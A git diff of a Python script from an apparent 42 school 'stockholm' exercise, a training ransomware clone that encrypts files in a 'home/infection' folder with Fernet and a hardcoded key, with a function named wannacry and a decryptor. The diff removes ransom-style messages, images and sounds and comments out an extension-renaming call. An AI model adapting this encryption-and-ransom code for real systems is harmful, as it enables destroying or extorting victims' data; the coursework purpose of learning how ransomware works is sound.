@@ -6,7 +6,7 @@
 #    By: mariza <mariza@student.42.fr>              +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2023/05/10 09:46:33 by mariza            #+#    #+#              #
-#    Updated: 2023/05/13 12:34:10 by mariza           ###   ########.fr        #
+#    Updated: 2023/05/30 09:56:06 by mariza           ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -14,11 +14,10 @@ import argparse
 import os
 import os.path
 from cryptography.fernet import Fernet
-from playsound import playsound
-import climage
 
 
-RUTA = '/Users/mariza/Desktop/clone-estocolmo/home/infection'
+
+RUTA = '/Users/mariza/Desktop/repo-terminados-bootcamp/stockholm/home/infection'
 KEY = 'PyMEtpcBTPNHI7y_wlN1dHK_K_NElzbGeYT92ksziJo='
 parser = argparse.ArgumentParser()
 parser.add_argument ('-v', '--version', dest = 'v', action = 'store_true',  help = 'muestra la version del programa')
@@ -101,13 +100,9 @@ def wannacry(silent=False):
         except:
             print('La carpeta home no exite.')
     
-        if not silent:
-            imagen = climage.convert('/Users/mariza/Desktop/clone-estocolmo/tools/YArM.gif')
-            print (imagen)
-            print ('LA HAS CAGADO, TE VA A TOCAR PAGAR')        
-            playsound('/Users/mariza/Desktop/clone-estocolmo/tools/wanna.mp3')
         
-        new_ext(RUTA)
+        
+       # new_ext(RUTA)
     ##desencripto los archivos de la carpeta que tengan la extension .ft
 def desencriptado_archivos(key, file, silent=False):
     try:
@@ -124,11 +119,7 @@ def desencriptado_archivos(key, file, silent=False):
                     f.write(descifrado)
                 if not silent:
                     print(f'El archivo {x} ha sido desencriptado')
-        if not silent:
-            imagen = climage.convert('/Users/mariza/Desktop/clone-estocolmo/tools/calaveraw.jpg')
-            print (imagen)
-            print ('GRACIAS POR TU DINERO, HASTA LA PROXIMA')        
-            playsound('/Users/mariza/Desktop/clone-estocolmo/tools/decript.mp3')     
+            
     except:
         print('La clave introducida no es válida')    
             
